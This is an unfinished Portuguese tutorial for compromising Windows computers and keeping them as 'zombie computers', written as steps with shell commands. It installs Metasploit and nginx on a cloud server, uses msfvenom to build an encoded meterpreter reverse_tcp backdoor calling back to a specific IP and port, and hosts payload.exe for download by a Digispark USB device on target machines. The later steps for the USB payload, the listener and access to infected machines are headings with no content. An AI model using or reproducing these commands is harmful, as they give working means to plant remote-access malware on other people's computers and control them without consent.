PASSOS 

1 - Criar uma INSTANCIA e definir um IP estatico

    Eu estarei utilizando o GCP(Google cloud platform) mas você pode utilizar o provedor de CLOUD que deseja ou até mesmo um VPS.

    1 - Acesso meu console e crio a instancia. Estancia essa que é bem basica uma micro com SO Debian 9

    2 - Com o a instancia criada, eu defino um IP estatico para minha instancia. Um IP estatico é necessario para que não ocorra o risco do IP mudar e perdemos nossos "computadores zumbis" já conquistados.

2 - Instalar METASPLOIT e NGINX


        Nesse passo vamos instalar nosso canivete suiço METASPLOIT para criamos nosso BACKDOOR e orquestramos nossos "computadores zumbis" o nginx vai ser necessario para que o nosso payload do Digispark possa fazer o download do BACKDOOR para dentro da maquina alvo.

        1 - Conecte a sua instancia por ssh para instalarmos o METASPLOIT e o NGINX para isso rode 

            $ ssh usuario@instancia 

            apos se conectar rode instale o nginx ou apache como preferir

            $ sudo apt-get install -y nginx

            agora os comandos abaixo é para instalar o METASPLOIT

            $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

            conceder permisão de execução para o instalador

            $ chmod +x msfinstall

            agora execulte o mesmo

            $ ./msfinstall

            Efeito isso e não deu nenhum error é so verificar se ta tudo certo.
            Como vai ser a primeira execução ele vai perguntar se você deseja criar um novo banco de dados para o metasploit você responde com um sim e seus dados que ele vai criar as credenciais e configurar tudo para que você possa utilizar a ferramenta

            $ msfconsole --version

3 - Criar BACKDOOR REVERSE


        1 -  Agora vamos criar o backdoor definindo qual tipo de conexão iremos usar que vai ser uma REVERSA TCP para qual tipo de SO,
        qual vai ser o nosso LHOST(IP de comunicação) nossa LPORT(porta de comunicação) o tipo da extenção do backdoor -f exe o algoritmo de criptografia e compreensão, -i o numero de interações do encoded com o backdoor, -o o nosso arquivo de saida. 

        se você estive e uma cloud provavelmente vai ter que criar uma regra de firewall para a sua porta escolhida

        $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=34.97.212.80 LPORT=5000 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe

        Rodando um ls verá que o arquivo payload.exe foi criado


4 - Configurar NGINX para download do backdoor

        1 - Vamos criar uma copia dele dentro da nossa pasta do servidor 

        $ sudo cp ./payload.exe /var/www/html/payload.exe

        3 - feito isso nosso arquivo vai esta disponivel para download em 

        http://34.97.212.80/payload.exe


5 - Digispark





6 - Criar Payload injectar o backdoor

7 - INICIAR ESCULTA DAS CONEXOES DO BACKDOOR

8 - Obter acesso a uma maquina infectada